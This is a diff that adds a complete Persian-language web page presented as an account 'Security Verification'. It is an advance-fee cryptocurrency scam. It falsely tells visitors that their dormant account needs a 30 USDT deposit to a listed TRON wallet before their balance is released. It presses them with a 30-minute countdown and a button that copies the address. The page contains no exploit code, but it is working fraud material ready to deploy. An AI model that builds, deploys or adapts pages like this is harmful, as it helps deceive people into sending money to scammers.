@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html lang="fa" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Security Verification</title>
+    <style>
+        body { background-color: #0b111a; color: white; font-family: sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
+        .card { background: #1a202c; padding: 25px; border-radius: 20px; width: 100%; max-width: 400px; text-align: center; border: 1px solid #333; }
+        .timer { font-size: 30px; font-weight: bold; color: #f0b90b; margin: 15px 0; }
+        .msg { background: rgba(240, 185, 11, 0.05); border: 1px solid #f0b90b; padding: 15px; border-radius: 10px; font-size: 14px; line-height: 1.6; margin-bottom: 20px; text-align: justify; }
+        .highlight { color: #f0b90b; font-weight: bold; }
+        .info-note { font-size: 12px; color: #a0aec0; margin-top: 15px; line-height: 1.5; }
+        .addr-box { background: #0b111a; padding: 12px; border-radius: 8px; font-size: 12px; border: 1px dashed #f0b90b; color: #f0b90b; cursor: pointer; word-break: break-all; margin-top: 5px; }
+        .btn { width: 100%; padding: 15px; border-radius: 12px; border: none; background: #f0b90b; color: black; font-weight: bold; margin-top: 20px; cursor: pointer; font-size: 16px; }
+    </style>
+</head>
+<body>
+<div class="card">
+    <div style="font-size: 12px; color: #848e9c;">وضعیت حساب: <span style="color: #f0b90b;">در انتظار تأیید</span></div>
+    <div class="timer" id="timer">30:00</div>
+    
+    <div class="msg">
+        به دلیل اینکه از این حساب به مدت طولانی استفاده نشده است، جهت فعال‌سازی مجدد نودهای شبکه و آزادسازی موجودی، باید مقدار <span class="highlight">30 تتر (USDT)</span> به آدرس زیر واریز نمایید.
+    </div>
+
+    <div style="text-align: right; font-size: 11px; color: #848e9c;">Network: <b>TRC20 (TRON)</b></div>
+    <div class="addr-box" id="wallet" onclick="copy()">
+        TX66axYXaDuwQczWb6CWdzgCsiEa5J98rk
+    </div>
+
+    <div class="info-note">
+        💡 این آدرس فقط مختص حساب شماست؛ واریز شما به صورت هوشمند شناسایی شده و قابلیت برداشت بلافاصله به صورت خودکار فعال می‌گردد.
+    </div>
+
+    <button class="btn" onclick="copy()">کپی آدرس و تایید نهایی</button>
+</div>
+
+<script>
+    let t = 1800;
+    setInterval(() => {
+        let m = Math.floor(t / 60), s = t % 60;
+        document.getElementById('timer').innerHTML = m + ":" + (s < 10 ? '0' + s : s);
+        if (t > 0) t--;
+    }, 1000);
+
+    function copy() {
+        var address = "TX66axYXaDuwQczWb6CWdzgCsiEa5J98rk";
+        navigator.clipboard.writeText(address);
+        alert("آدرس کپی شد. پس از واریز 30 تتر، سیستم ظرف چند دقیقه موجودی شما را آزاد می‌کند.");
+    }
+</script>
+</body>
+</html>
